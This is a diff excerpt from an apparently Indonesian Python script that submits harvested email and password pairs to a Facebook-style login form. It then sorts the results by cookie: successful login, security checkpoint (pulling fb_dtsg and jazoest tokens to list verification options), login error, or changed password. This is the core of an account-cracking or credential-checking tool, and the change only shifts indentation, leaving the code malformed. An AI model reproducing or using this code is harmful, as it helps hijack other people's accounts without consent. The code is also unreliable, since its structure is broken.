@@ -527,14 +527,14 @@ class log_hasil(user, pasw):
             data.update({i.get("name"):i.get("value")})
         else:continue
         data.update({"email":user,"pass":pasw})
-    try:
+      try:
         run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
-    except requests.exceptions.TooManyRedirects:
+      except requests.exceptions.TooManyRedirects:
         print(f"{B} | ")
         print(f"{M}[•] Akun terkena spam")
-    if "c_user" in ses.cookies:
+      if "c_user" in ses.cookies:
         print(f"{P}[•]{I} Akun berhasil di login")
-    elif "checkpoint" in ses.cookies:
+      elif "checkpoint" in ses.cookies:
         form = run.find("form")
         dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
         jzst = form.find("input",{"name":"jazoest"})["value"]
@@ -553,10 +553,10 @@ class log_hasil(user, pasw):
         for opt in range(len(ngew)):
             print(f"{B} | ")
             jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
-    elif "login_error" in str(run):
+      elif "login_error" in str(run):
         oh = run.find("div",{"id":"login_error"}).find("div").text
         print(f"{P}[•]{M}>>>> {oh}")
-    else:
+      else:
         print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
    def cek_opsi(user, pasw):
      global aman,cpsalah
